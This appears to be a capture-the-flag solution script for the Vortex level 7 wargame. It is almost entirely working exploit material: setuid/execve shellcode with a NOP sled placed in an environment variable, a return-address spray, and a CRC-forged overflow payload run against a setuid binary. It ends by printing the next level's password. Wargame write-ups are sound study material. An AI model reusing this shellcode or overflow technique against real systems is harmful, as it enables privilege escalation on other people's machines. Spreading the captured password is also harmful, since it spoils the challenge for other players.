# !/bin/sh
# We have to create a payload that will run the shell code and also pass the CRC check

mkdir /tmp/ballban_vortex7
cd /tmp/ballban_vortex7

# Set env
# EGG is the shellcode that will be executed
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 100 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# EGG2 is the address that jump to EGG1
export EGG2=$(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'a' * 2 + struct.pack('<I', 0xdd88ffff) * 10)")

# Create check_env.c and compile
nano check_env.c
gcc -m32 check_env.c -o check_env

# Check address of EGG and put EGG's address in EGG2
./check_env EGG

# Check address of EGG2
# This is the address that we will put in the payload
./check_env EGG2

# Check vortex.ipynb for the payload
# We find some code that you can get any string with crc32 decode 
# Site: https://blog.stalkr.net/2011/03/crc-32-forging.html

# Run vortex7 with gef
gef /vortex/vortex7
run $(python3 -c 'import sys; import struct; sys.stdout.buffer.write(b"aa\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xc7\xec\x90\xa7")')

# Put breakpoint at return of main
# Check the return address and adjust EGG and EGG2 address
# I don't know why but I have to plus 16 to EGG's address and 18 to EGG2's address

# Run vortex7 with the payload
strace /vortex/vortex7 $(python3 -c 'import sys; import struct; sys.stdout.buffer.write(b"aa\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xdf\xdc\xff\xff\xc7\xec\x90\xa7")')

cat /etc/vortex_pass/vortex8 
# password: niEUGtu7f